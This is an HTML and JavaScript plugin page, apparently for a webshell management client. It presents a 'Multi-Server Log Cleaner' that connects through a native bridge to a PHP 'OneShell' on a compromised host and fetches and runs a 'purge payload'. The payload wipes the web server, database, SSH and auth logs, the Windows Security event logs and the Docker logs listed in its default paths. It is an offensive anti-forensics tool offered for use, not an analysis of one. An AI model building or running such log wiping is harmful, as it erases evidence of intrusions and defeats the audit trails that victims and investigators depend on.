<!DOCTYPE html>
<html lang="en-US">
<head>
    <meta charset="UTF-8">
    <title>Multi-Server Log Cleaner</title>
    <style>
        html, body {
            height: 100%;
            margin: 0;
            padding: 0;
            background-color: #000000;
            color: #ffffff;
            overflow-y: auto; 
            overflow-x: hidden;
        }
        body { 
            font-family: 'Courier New', Courier, monospace;
            display: flex;
            justify-content: center;
            align-items: center;
        }
        
        .container { 
            width: 100%;
            max-width: 650px; 
            background: #000000; 
            padding: 25px; 
            border-radius: 0px;
            border: 1px solid #ffffff;
        }
        
        h2 { 
            color: #ffffff;
            margin-top: 0; 
            border-bottom: 1px solid #ffffff; 
            padding-bottom: 10px; 
            font-size: 18px;
            text-transform: uppercase;
            letter-spacing: 2px;
        }
        
        .status-bar { 
            background: #000000; 
            padding: 10px; 
            margin-bottom: 20px; 
            font-size: 12px; 
            border: 1px dashed #ffffff;
            text-transform: uppercase;
        }
        
        .badge { padding: 0px 4px; font-weight: bold; }
        .badge-active { background: #ffffff; color: #000000; }
        .badge-error { border: 1px dashed #ffffff; background: transparent; color: #ffffff; }
        
        .form-group { margin-bottom: 15px; }
        
        label { 
            display: block; 
            margin-bottom: 5px; 
            color: #ffffff; 
            text-transform: uppercase; 
            font-size: 12px;
            font-weight: bold;
        }
        
        input[type="text"], select, textarea { 
            width: 100%; 
            background: #000000; 
            border: 1px solid #ffffff; 
            color: #ffffff; 
            padding: 8px; 
            border-radius: 0px; 
            box-sizing: border-box; 
            font-family: inherit;
        }
        input[type="text"]:focus, select:focus, textarea:focus {
            outline: none;
            background: #111111;
        }
        
        /* 針對下拉選單的選項樣式修正（部分瀏覽器相容） */
        select option {
            background: #000000;
            color: #ffffff;
        }
        
        textarea {
            resize: vertical; 
            min-height: 100px;  
        }
        
        button { 
            background-color: transparent; 
            color: #ffffff; 
            font-weight: bold; 
            font-family: inherit;
            border: 1px solid #ffffff; 
            padding: 10px 25px; 
            cursor: pointer; 
            border-radius: 0px; 
            text-transform: uppercase;
            letter-spacing: 1px;
        }
        button:hover:not(:disabled) { 
            background-color: #ffffff; 
            color: #000000;
        }
        button:disabled { 
            border-color: #444444; 
            color: #444444; 
            cursor: not-allowed; 
        }
        
        h3 {
            font-size: 13px;
            color: #ffffff;
            text-transform: uppercase;
            margin-top: 25px;
        }
        
        .console { 
            background: #000000; 
            border: 1px solid #ffffff; 
            padding: 15px; 
            height: 180px; 
            overflow-y: auto; 
            white-space: pre-wrap;
            font-size: 13px;
            line-height: 1.5;
        }

        .msf-line { margin-bottom: 4px; color: #ffffff; } 
        .msf-info { color: #3498db; font-weight: bold; }
        .msf-success { color: #2ecc71; font-weight: bold; }
        .msf-warn { color: #f1c40f; font-weight: bold; }
        .msf-error { color: #e74c3c; font-weight: bold; }
    </style>
</head>
<body>

<div class="container">
    <h2>[ Multi-Server Log Cleaner ]</h2>
    
    <div class="status-bar" id="statusBar">
        [*] Initializing system controller... awaiting logs...
    </div>
    
    <div class="form-group">
        <label>> Select Server Type</label>
        <select id="serverType" onchange="updateDefaultPaths()">
            <option value="apache">Apache</option>
            <option value="nginx">Nginx</option>
            <option value="iis">IIS (Windows)</option>
            <option value="tomcat">Tomcat</option>
        </select>
    </div>
    
    <div class="form-group">
        <label>> Target Log Paths (One per line)</label>
        <textarea id="logPaths">/var/log/apache2/access.log
/var/log/apache2/error.log</textarea>
    </div>

    <button id="cleanBtn" onclick="executePlugin()" disabled>Wipe Logs</button>

    <h3>Output</h3>
    <div class="console" id="consoleOutput"></div>
</div>

<script>
    const defaultPaths = {
        // Web services
        apache: [
            "/var/log/apache2/access.log",
            "/var/log/apache2/error.log",
            "/var/log/httpd/access_log",
            "/var/log/httpd/error_log"
        ],
        nginx: [
            "/var/log/nginx/access.log",
            "/var/log/nginx/error.log"
        ],
        iis: [
            "C:\\inetpub\\logs\\LogFiles\\W3SVC1\\ex*.log",
            "C:\\Windows\\System32\\LogFiles\\HTTPERR\\*.log"
        ],

        // Tomcat
        tomcat_linux: [
            "/usr/local/tomcat/logs/catalina.out",
            "/usr/local/tomcat/logs/localhost_access_log.txt",
            "/var/log/tomcat/catalina.out",
            "/var/log/tomcat/localhost_access_log*.txt"
        ],
        tomcat_win: [
            "C:\\Program Files\\Apache Software Foundation\\Tomcat *\\logs\\catalina.*.log",
            "C:\\Program Files\\Apache Software Foundation\\Tomcat *\\logs\\localhost_access_log.*.txt"
        ],

        // XAMPP
        xampp: [
            "C:\\xampp\\apache\\logs\\access.log",
            "C:\\xampp\\apache\\logs\\error.log",
            "C:\\xampp\\mysql\\data\\mysql_error.log",
            "C:\\xampp\\tomcat\\logs\\catalina.out",
            
            // MacOS / OSX
            "/Applications/XAMPP/xamppfiles/logs/access_log",
            "/Applications/XAMPP/xamppfiles/logs/error_log"
        ],

        // Databases
        mysql: [
            "/var/log/mysql/error.log",
            "/var/log/mysql/mysql-slow.log",
            "/var/lib/mysql/*.err"
        ],
        postgresql: [
            "/var/log/postgresql/postgresql-*.log",
            "/var/lib/pgsql/data/log/*.log"
        ],
        mongodb: [
            "/var/log/mongodb/mongod.log",
            "C:\\Program Files\\MongoDB\\Server\\*\\log\\mongod.log"
        ],
        redis: [
            "/var/log/redis/redis-server.log",
            "/var/log/redis/redis.log"
        ],

        // OS & System Services
        linux_system: [
            "/var/log/syslog",
            "/var/log/messages",
            "/var/log/auth.log",
            "/var/log/secure",
            "/var/log/dmesg"
        ],
        windows_system: [
            "C:\\Windows\\System32\\Winevt\\Logs\\Application.evtx",
            "C:\\Windows\\System32\\Winevt\\Logs\\System.evtx",
            "C:\\Windows\\System32\\Winevt\\Logs\\Security.evtx"
        ],
        ssh: [
            "/var/log/auth.log",
            "/var/log/secure"
        ],

        // Containers & Runtimes
        docker: [
            "/var/lib/docker/containers/*/*-json.log"
        ],
        pm2: [
            "~/.pm2/logs/*.log"
        ]
    };

    function updateDefaultPaths() {
        const server = document.getElementById('serverType').value;
        const pathsArray = defaultPaths[server] || [];

        document.getElementById('logPaths').value = pathsArray.join('\n');
        appendLog(`[*] SWITCHED TARGET SERVER ENVIRONMENT TO: ${server.toUpperCase()}`);
    }

    const pluginManifest = {
        "supportedLangs": [
            "PHP/v8.X/OneShell",
        ]
    };

    let currentShellType = "";

    function appendLog(text) {
        const consoleOutput = document.getElementById('consoleOutput');
        if (!text) return;

        const lines = text.split('\n');
        
        lines.forEach(line => {
            if (line.trim() === "") return;

            let div = document.createElement('div');
            div.className = 'msf-line';

            if (line.startsWith('[*]')) {
                div.innerHTML = `<span class="msf-info">[*]</span> ${line.substring(3)}`;
            } else if (line.startsWith('[+]')) {
                div.innerHTML = `<span class="msf-success">[+]</span> ${line.substring(3)}`;
            } else if (line.startsWith('[-]')) {
                div.innerHTML = `<span class="msf-error">[-]</span> ${line.substring(3)}`;
            } else if (line.startsWith('[!]')) {
                div.innerHTML = `<span class="msf-warn">[!]</span> ${line.substring(3)}`;
            } else {
                div.innerText = line;
            }

            consoleOutput.appendChild(div);
        });

        consoleOutput.scrollTop = consoleOutput.scrollHeight;
    }

    window.addEventListener('DOMContentLoaded', async () => {
        const statusBar = document.getElementById('statusBar');
        const cleanBtn = document.getElementById('cleanBtn');

        try {
            if (window.chrome && window.chrome.webview && window.chrome.webview.hostObjects.nativeBridge) {
                const bridge = window.chrome.webview.hostObjects.nativeBridge;
                
                currentShellType = await bridge.fnGetShellType();

                if (pluginManifest.supportedLangs.includes(currentShellType)) {
                    statusBar.innerHTML = `GATEWAY_ENV: <span class="badge badge-active">${currentShellType.toUpperCase()}</span> // STATUS: CLEANER READY`;
                    cleanBtn.disabled = false;
                    appendLog("[*] LINK ESTABLISHED.");
                    appendLog("[*] READY TO PURGE TARGET LOG FILES.");
                } else {
                    statusBar.innerHTML = `GATEWAY_ENV: <span class="badge badge-error">${currentShellType.toUpperCase()}</span> // STATUS: INCOMPATIBLE`;
                    appendLog(`[-] ABORTED. CLEANER REQUIRES: [${pluginManifest.supportedLangs.join(', ')}].`);
                    appendLog(`[-] NODE RUNNING: ${currentShellType}.`);
                }
            } else {
                appendLog("[!] BRIDGE_ERROR: HOST_NOT_FOUND. CORE OVERRIDE RE-ROUTE REQUIRED.");
            }
        } catch (e) {
            appendLog("[!] EXCEPTION_CAUGHT: " + e.message.toUpperCase());
        }
    });

    async function executePlugin() {
        const serverType = document.getElementById('serverType').value;
        const targetLogs = document.getElementById('logPaths').value;
        
        appendLog(`[*] ALLOCATING PURGE PAYLOAD FOR: ${currentShellType.toUpperCase()}`);

        const bridge = window.chrome.webview.hostObjects.nativeBridge;
        const currentDir = window.location.pathname.substring(0, window.location.pathname.lastIndexOf('/') + 1);
        const payloadCode = await bridge.fnGetPayload(currentDir, currentShellType, "payload");
        
        appendLog(`[*] SELECTED MODULE: [${serverType.toUpperCase()}_WIPER]`);
        appendLog('[+] EXPEDITE REMOTE BUFFER ACCESS...');
        appendLog('[*] EXECUTING LOG WIPER VIA BRIDGE...');

        const result = await bridge.fnRun(targetLogs, payloadCode, currentShellType);
        
        appendLog(result.toUpperCase());
    }
</script>

</body>
</html>
